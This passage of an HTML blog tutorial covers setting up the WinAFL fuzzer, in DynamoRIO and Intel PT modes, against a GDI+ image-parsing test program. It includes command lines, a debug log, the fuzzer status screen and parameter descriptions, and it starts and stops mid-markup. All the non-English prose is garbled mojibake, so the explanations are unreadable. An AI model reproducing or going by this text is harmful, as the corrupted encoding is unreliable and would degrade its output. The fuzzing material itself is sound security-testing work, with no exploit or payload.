æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ</h2><p>ä½¿ç”¨ IDA Pro å¯¹ test_gdiplus.exe è¿›è¡Œåæ±‡ç¼–ï¼Œtarget_offset ä¸º <code>0x10E0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.text:00000001400010E0 ; int __cdecl main(int argc, const char **argv, const char **envp)<br>.text:00000001400010E0 main            proc near               ; CODE XREF: __scrt_common_main_seh(void)+107â†“p<br>.text:00000001400010E0                                         ; DATA XREF: .rdata:0000000140002B6Câ†“o ...<br></code></pre></td></tr></table></figure><p>å…ˆç”¨ drrun.exe æµ‹è¯• winafl æ˜¯å¦æ­£å¸¸å·¥ä½œï¼Œå…¶å®å°±æ˜¯å¾ªç¯æ‰§è¡Œ 10 æ¬¡ç›®æ ‡ç¨‹åºã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">D:\DynamoRIO\bin64\drrun<span class="hljs-selector-class">.exe</span> -c winafl<span class="hljs-selector-class">.dll</span> -debug ^<br>-target_module test_gdiplus<span class="hljs-selector-class">.exe</span> -target_offset <span class="hljs-number">0</span>x10E0 -fuzz_iterations <span class="hljs-number">10</span> ^<br>-nargs <span class="hljs-number">2</span> -- test_gdiplus<span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">input</span>.bmp<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤åï¼Œåœ¨å½“å‰ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ª log æ–‡ä»¶ï¼Œæ–‡ä»¶åä¸º <code>afl.test_gdiplus.exe.14172.0000.proc.log</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">dynamorio</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">winafl</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">drx</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">drreg</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">drmgr</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">drwrap</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-type">test_gdiplus</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">gdiplus</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">VCRUNTIME140</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-type">msvcp_win</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">win32u</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">ucrtbase</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">KERNELBASE</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">gdi32full</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">KERNEL32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">msvcrt</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">IMM32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">RPCRT4</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">GDI32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">combase</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">USER32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">ntdll</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">UxTheme</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">OLEAUT32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">bcrypt</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">SECHOST</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">ADVAPI32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">WindowsCodecs</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">MSCTF</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-variable">Everything</span> <span class="hljs-variable">appears</span> <span class="hljs-variable">to</span> <span class="hljs-variable">be</span> <span class="hljs-variable">running</span> <span class="hljs-variable">normally</span><span class="hljs-operator">.</span><br><span class="hljs-variable">Coverage</span> <span class="hljs-variable">map</span> <span class="hljs-variable">follows</span><span class="hljs-operator">:</span><br>                                            <br></code></pre></td></tr></table></figure><p><code>Everything appears to be running normally.</code> è¡¨æ˜ winafl è‡ªå·±è®¤ä¸ºæ²¡æœ‰å‡ºé”™ã€‚ log æ–‡ä»¶ä¸­è¿˜åŒ…å«äº†å…¶ä»–æœ‰ç”¨ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´ç›®æ ‡ç¨‹åºåŠ è½½çš„æ¨¡å—ã€‚è¿™äº›åŠ è½½çš„æ¨¡å—å¯ä»¥ç”¨æ¥è®¾ç½® <code>-coverage_module</code>æ¥ç»Ÿè®¡ä½ æ‰€å…³æ³¨çš„ coverageã€‚</p><p>ä½¿ç”¨ drrun.exe éªŒè¯æˆåŠŸåï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢å‘½ä»¤æµ‹è¯• winafl æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz.exe -i <span class="hljs-keyword">in</span> -o out -D D:\DynamoRIO\bin64 -t 20000 ^<br>-- -coverage_module gdiplus.dll -coverage_module WindowsCodecs.dll -fuzz_iterations 5000 ^<br>-target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåä¸Šé¢çš„å‘½ä»¤åï¼Œå¦‚æœå‘ç° total paths çš„æ•°å­—åœ¨ä¸æ–­å˜åŒ–ï¼Œ winafl å°±å·²ç»å¯ä»¥æ­£å¸¸å·¥ä½œäº†ï¼Œæ­å–œ ğŸ˜„</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+- process timing -------------------------------------+- overall results ----+<br>|<span class="hljs-string">        run time : 0 days, 0 hrs, 0 min, 1 sec        </span>|<span class="hljs-string">  cycles done : 0     </span>|<br>|<span class="hljs-string">   last new path : 0 days, 0 hrs, 0 min, 1 sec        </span>|<span class="hljs-string">  total paths : 2     </span>|<br>|<span class="hljs-string"> last uniq crash : none seen yet                      </span>|<span class="hljs-string"> uniq crashes : 0     </span>|<br>|<span class="hljs-string">  last uniq hang : none seen yet                      </span>|<span class="hljs-string">   uniq hangs : 0     </span>|<br>+- cycle progress --------------------+- map coverage -+----------------------+<br>|<span class="hljs-string">  now processing : 0 (0.00%)         </span>|<span class="hljs-string">    map density : 1.65% / 1.65%        </span>|<br>|<span class="hljs-string"> paths timed out : 0 (0.00%)         </span>|<span class="hljs-string"> count coverage : 1.00 bits/tuple      </span>|<br>+- stage progress --------------------+ findings in depth --------------------+<br>|<span class="hljs-string">  now trying : arith 8\8             </span>|<span class="hljs-string"> favored paths : 1 (50.00%)            </span>|<br>|<span class="hljs-string"> stage execs : 388/389 (99.74%)      </span>|<span class="hljs-string">  new edges on : 2 (100.00%)           </span>|<br>|<span class="hljs-string"> total execs : 619                   </span>|<span class="hljs-string"> total crashes : 0 (0 unique)          </span>|<br>|<span class="hljs-string">  exec speed : 353.3/sec             </span>|<span class="hljs-string">  total tmouts : 0 (0 unique)          </span>|<br>+- fuzzing strategy yields -----------+---------------+- path geometry -------+<br>|<span class="hljs-string">   bit flips : 0/56, 1/55, 0/53                      </span>|<span class="hljs-string">    levels : 2         </span>|<br>|<span class="hljs-string">  byte flips : 0/7, 0/6, 0/4                         </span>|<span class="hljs-string">   pending : 2         </span>|<br>|<span class="hljs-string"> arithmetics : 0/0, 0/0, 0/0                         </span>|<span class="hljs-string">  pend fav : 1         </span>|<br>|<span class="hljs-string">  known ints : 0/0, 0/0, 0/0                         </span>|<span class="hljs-string"> own finds : 1         </span>|<br>|<span class="hljs-string">  dictionary : 0/0, 0/0, 0/0                         </span>|<span class="hljs-string">  imported : n/a       </span>|<br>|<span class="hljs-string">       havoc : 0/0, 0/0                              </span>|<span class="hljs-string"> stability : 99.63%    </span>|<br>|<span class="hljs-string">        trim : 0.00%/1, 0.00%                        +-----------------------+</span><br><span class="hljs-string">^C----------------------------------------------------+   [cpu000001:  14%]</span><br></code></pre></td></tr></table></figure><h2 id="3-DynamoRIO-æ¨¡å¼-winafl-dll-å„ä¸ªå‚æ•°çš„å…·ä½“å«ä¹‰"><a href="#3-DynamoRIO-æ¨¡å¼-winafl-dll-å„ä¸ªå‚æ•°çš„å…·ä½“å«ä¹‰" class="headerlink" title="3. DynamoRIO æ¨¡å¼ winafl.dll å„ä¸ªå‚æ•°çš„å…·ä½“å«ä¹‰"></a>3. DynamoRIO æ¨¡å¼ winafl.dll å„ä¸ªå‚æ•°çš„å…·ä½“å«ä¹‰</h2><p>winafl.dll æ˜¯ DynamoRIO client (instrumentation) codeï¼Œå‚æ•°æŒºå¤š Winafl çš„ README ä¸­ä»‹ç»äº†ä¸‹é¢è¿™äº›å‚æ•°ã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">-covtype         - <span class="hljs-keyword">the</span> type <span class="hljs-keyword">of</span> coverage being recorded. Supported options are<br>                   bb (basic block, default) <span class="hljs-keyword">or</span> edge.<br><br>-coverage_module - module <span class="hljs-keyword">for</span> which <span class="hljs-built_in">to</span> record coverage. Multiple module flags<br>                   are supported.<br><br>-target_module   - module which <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> target <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">to</span> <span class="hljs-title">be</span> <span class="hljs-title">fuzzed</span>.</span><br>                   Either -target_method <span class="hljs-keyword">or</span> -target_offset need <span class="hljs-built_in">to</span> be<br>                   specified together <span class="hljs-keyword">with</span> this option.<br><br>-target_method   - name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> method <span class="hljs-built_in">to</span> fuzz <span class="hljs-keyword">in</span> persistent mode. For this <span class="hljs-built_in">to</span><br>                   work either <span class="hljs-keyword">the</span> method needs <span class="hljs-built_in">to</span> be exported <span class="hljs-keyword">or</span> <span class="hljs-keyword">the</span> symbols<br>                   <span class="hljs-keyword">for</span> target_module need <span class="hljs-built_in">to</span> be available. Otherwise use<br>                   -target_offset instead.<br><br>-target_offset   - <span class="hljs-built_in">offset</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> method <span class="hljs-built_in">to</span> fuzz <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">start</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> module.<br><br>-fuzz_iterations - Maximum <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> iterations <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> target <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">to</span> <span class="hljs-title">run</span></span><br>                   <span class="hljs-keyword">before</span> restarting <span class="hljs-keyword">the</span> target <span class="hljs-built_in">process</span>.<br><br>-nargs           - Number <span class="hljs-keyword">of</span> arguments <span class="hljs-keyword">the</span> fuzzed method takes. This is used<br>                   <span class="hljs-built_in">to</span> save/restore <span class="hljs-keyword">the</span> arguments between runs.<br><br>-call_convention - The default calling convention is cdecl <span class="hljs-keyword">on</span> <span class="hljs-title">32-bit</span> <span class="hljs-title">x86</span><br>                   platforms <span class="hljs-keyword">and</span> Microsoft x64 <span class="hljs-keyword">for</span> Visual Studio <span class="hljs-number">64</span>-bit<br>                   applications. Possible values:<br>                       * fastcall: fastcall<br>                       * ms64: Microsoft x64 (Visual Studio)<br>                       * stdcall: cdecl <span class="hljs-keyword">or</span> stdcall<br>                       * thiscall: thiscall<br><br>-debug           - Debug mode. Does <span class="hljs-keyword">not</span> <span class="hljs-keyword">try</span> <span class="hljs-built_in">to</span> connect <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> server. Outputs<br>                   <span class="hljs-keyword">a</span> <span class="hljs-built_in">log</span> <span class="hljs-built_in">file</span> containing loaded modules, opened <span class="hljs-built_in">files</span> <span class="hljs-keyword">and</span><br>                   coverage information.<br><br>-logdir          - specifies <span class="hljs-keyword">in</span> which <span class="hljs-built_in">directory</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">log</span> <span class="hljs-built_in">file</span> will be written<br>                   (only <span class="hljs-built_in">to</span> be used <span class="hljs-keyword">with</span> -debug).<br><br>-thread_coverage - If <span class="hljs-built_in">set</span>, WinAFL will only collect coverage <span class="hljs-built_in">from</span> <span class="hljs-keyword">a</span> thread<br>                   that executed <span class="hljs-keyword">the</span> target <span class="hljs-function"><span class="hljs-keyword">function</span></span><br></code></pre></td></tr></table></figure><ul><li><code>-nargs</code> target method æˆ–è€… target offset çš„å‚æ•°ä¸ªæ•°</li><li><code>-fuzz_iterations</code> é‡å¯è¿›ç¨‹å‰ï¼Œå¾ªç¯æ‰§è¡Œ target method æˆ–è€… target offset çš„æ¬¡æ•°</li><li><code>-target_moudle</code> fuzz çš„ç›®æ ‡æ¨¡å—ï¼Œéœ€è¦å’Œ target method æˆ–è€… target offset ä¸€èµ·ä½¿ç”¨</li><li><code>-target_method</code> persistent mode ä¸‹ fuzz çš„å‡½æ•°åï¼ˆæ–¹æ³•åï¼‰ï¼Œéœ€è¦æœ‰ç¬¦å· ï¼ˆsymbolsï¼‰</li><li><code>-target_offset</code> fuzz çš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰ç›¸å¯¹äºæ¨¡å—èµ·å§‹åœ°å€çš„åç§»</li><li><code>-coverage_module</code> ç»Ÿè®¡è¦†ç›–ç‡çš„æ¨¡å—ï¼Œå¯ä»¥ç»Ÿè®¡å¤šä¸ªæ¨¡å—çš„ coverageï¼Œå³æŒ‡å®šå¤šä¸ª -coverage_module å‚æ•°</li><li><code>-covtype</code> bb æˆ–è€… edgeï¼Œbb ï¼ˆbasic block ä¸ºé»˜è®¤å€¼ï¼‰</li><li><code> -thread_coverage</code> ç”¨äºå¤šçº¿ç¨‹ç¨‹åºï¼Œåªç»Ÿè®¡ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ target function çš„è¦†ç›–ç‡å˜åŒ–</li></ul><h2 id="4-WinAFL-intel-PT-æ¨¡å¼ä½¿ç”¨"><a href="#4-WinAFL-intel-PT-æ¨¡å¼ä½¿ç”¨" class="headerlink" title="4. WinAFL intel PT æ¨¡å¼ä½¿ç”¨"></a>4. WinAFL intel PT æ¨¡å¼ä½¿ç”¨</h2><p>Intel PT (Processor Tracing) æ˜¯ Intel CPU çš„ä¸€ä¸ªç‰¹æ€§ï¼Œä» Intel ç¬¬5ä»£å¤„ç†å™¨å¼€å§‹æ”¯æŒï¼Œ5th generation çš„å¾®æ¶æ„ä¸º <code>Broadwell</code>ã€‚ç›¸å…³è¯´æ˜å¯ä»¥å‚è€ƒï¼š<a href="https://www.intel.com/content/www/us/en/support/articles/000056730/processors.html">https://www.intel.com/content/www/us/en/support/articles/000056730/processors.html</a></p><p>Windows 10 ä» v1809 å¼€å§‹æä¾›äº† Intel PT çš„é©±åŠ¨ï¼Œä½†ç›®å‰æ²¡æœ‰å…¬å¼€çš„æ–‡æ¡£æè¿°æ­¤é©±åŠ¨ï¼Œä¹Ÿæ²¡æœ‰æä¾›å®˜æ–¹çš„ APIã€‚Â Alex Ionescu æä¾›äº† <a href="https://github.com/ionescu007/winipt">winipt</a> library å’Œ Intel PT é©±åŠ¨äº¤äº’ï¼ŒWinAFL åˆ©ç”¨ winipt æ¥è·å¾— Intel PT çš„ Processo Tracing ä¿¡æ¯ã€‚</p><p>WinAFL ä½¿ç”¨ Intel PT æ¨¡å¼ï¼Œå’Œ DynamoRIO ä¸åŒéœ€è¦æŒ‡å®š <code>-P</code> , WinAFL Intel PT æ¨¡å¼é™¤äº†å’ŒDynamoRIO ç›¸åŒçš„å‚æ•°å¤–é¢å¤–æ·»åŠ äº†ä¸‹é¢å‡ ä¸ªå‚æ•°ï¼š</p><ul><li><code>-trace_size</code> æ¯æ¬¡æ‰§è¡Œ traget æ‰‹æœºçš„ trace ä¿¡æ¯çš„å­—èŠ‚æ•°ï¼Œå¿…é¡»æ˜¯2 çš„æ¬¡æ–¹å¹¶ä¸”å¤§äº 4096</li><li><code>-decode</code> å¤„ç† trace ä¿¡æ¯çš„è§£ç å™¨ï¼Œæœ‰ä¸‰ä¸ªå¯é€‰å€¼ï¼š<code>tip</code>,  <code>tip_ref</code> å’Œ <code>full</code> (full ä¸ºé»˜è®¤å€¼)</li><li><code>-nopersistent_trace</code> ç”±äºæ€§èƒ½çš„ç¼˜æ•…ï¼ŒWinAFL æ¯æ¬¡å¾ªç¯æ‰§è¡Œ target æ˜¯ä¸é‡å¯ç¨‹åºï¼Œè¿™ä¸ªé€‰é¡¹å¯ä»¥å¼ºåˆ¶ WinAFL æ¯æ¬¡æ‰§è¡Œ target éƒ½é‡å¯ï¼Œä¸€èˆ¬æ˜¯ä¸ºäº†è°ƒè¯•æ‰ä¼šå¯ç”¨è¿™ä¸ªé€‰é¡¹</li><li><code>-trace_cache_size</code>  trace ä¿¡æ¯çš„ cache å­—èŠ‚æ•°ï¼Œå’Œ <code>full</code> è§£ç å™¨ä¸€èµ·ä½¿ç”¨</li></ul><h2 id="5-æ£€æŸ¥-Intel-PT-æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ"><a href="#5-æ£€æŸ¥-Intel-PT-æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ" class="headerlink" title="5. æ£€æŸ¥ Intel PT æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ"></a>5. æ£€æŸ¥ Intel PT æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">winaflpt-debug.exe -debug -coverage_module gdipluss.dll -coverage_module WindowsCodecs.dll ^<br>-fuzz_iterations 10  -target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@<br></code></pre></td></tr></table></figure><p>ä¸Šé¢å‘½ä»¤å…¶å®å’Œæ£€æŸ¥ DynamoRIO æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œçš„å‘½ä»¤åŸºæœ¬ä¸€è‡´ï¼Œæ‰§è¡Œå‘½ä»¤åè¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">test_gdiplus.exe</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ntdll.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KERNEL32.DLjL</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KERNELBASE.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ucrtbase.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gdiplus.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">msvcrt.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">combase.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">VCRUNTIME140.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">RPCRT4.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">USER32.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">win32u.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">GDI32.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gdi32full.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">msvcp_win.dll</span><br><span class="hljs-attribute">Module loaded</span><span 